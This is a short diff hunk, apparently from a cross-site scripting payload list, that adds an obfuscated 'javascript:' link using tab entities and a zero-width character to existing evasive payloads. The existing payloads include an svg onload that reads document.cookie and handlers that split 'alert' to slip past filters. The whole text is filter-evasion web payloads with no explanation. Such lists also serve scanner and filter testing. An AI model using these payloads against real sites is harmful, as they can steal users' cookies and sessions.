@@ -46,3 +46,4 @@ svg onload=alert&#0000000040document.cookie)>
 "\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
 <details open ontoggle​=content['al'%2B'ert'](1) >
 <svg onload=alert&#0000000040document.cookie)>
+a href=javas&Tab;cript​:ale&Tab;rt()>clickme</a>
